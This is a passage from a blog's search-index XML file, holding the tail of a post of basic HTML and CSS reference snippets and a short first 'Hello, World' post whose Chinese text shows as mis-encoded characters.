   &lt;/dl&gt;</span><br><span class="line">27 &lt;head&gt;</span><br><span class="line">     &lt;style&gt;</span><br><span class="line">     .cities &#123;</span><br><span class="line">         background-color:black;</span><br><span class="line">         color:white;</span><br><span class="line">         margin:20px;</span><br><span class="line">         padding:20px;</span><br><span class="line">     &#125; </span><br><span class="line">     &lt;/style&gt;</span><br><span class="line">     &lt;/head&gt;</span><br><span class="line">28 &lt;!DOCTYPE html&gt;</span><br><span class="line">     &lt;html&gt;</span><br><span class="line">     &lt;head&gt;</span><br><span class="line">     &lt;style&gt;</span><br><span class="line">       span.red &#123;color:red;&#125;</span><br><span class="line">     &lt;/style&gt;</span><br><span class="line">     &lt;/head&gt;</span><br><span class="line">     &lt;body&gt;</span><br><span class="line"></span><br><span class="line">     &lt;h1&gt;My &lt;span class=<span class="string">&quot;red&quot;</span>&gt;Important&lt;/span&gt; Heading&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">     &lt;/body&gt;</span><br><span class="line">     &lt;/html&gt;</span><br><span class="line">29 &lt;iframe src=<span class="string">&quot;demo_iframe.htm&quot;</span> width=<span class="string">&quot;200&quot;</span> height=<span class="string">&quot;200&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">30 &lt;body background=<span class="string">&quot;http://www.w3school.com.cn/clouds.gif&quot;</span>&gt;</span><br><span class="line">31 &lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">     document.write(<span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">     &lt;/script&gt;</span><br><span class="line">     &lt;noscript&gt;Your browser does not support JavaScript!&lt;/noscript&gt;</span><br></pre></td></tr></table></figure></pre><p><a href="https://www.w3school.com.cn/html/html_quick.asp">Quick Search</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0</title>
      <link href="2020/03/22/0/"/>
      <url>2020/03/22/0/</url>
      
        <content type="html"><![CDATA[<h2 id="Hello-Worldï¼"><a href="#Hello-Worldï¼" class="headerlink" title="Hello,Worldï¼"></a>Hello,Worldï¼</h2><p>è¯´äººè¯ æˆ‘ç»ˆäºæœ‰è‡ªå·±çš„ç½‘ç«™å•¦ è™½ç„¶åªæ˜¯éƒ¨ç½²åœ¨githubä¸Šçš„<br>å…ˆåšä¸ªæµ‹è¯• ä¸‹å›åœ¨çœ‹çœ‹è¦å¼„å•¥<br>peach..å•Šä¸â€¦<br>peaceï½ï½</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
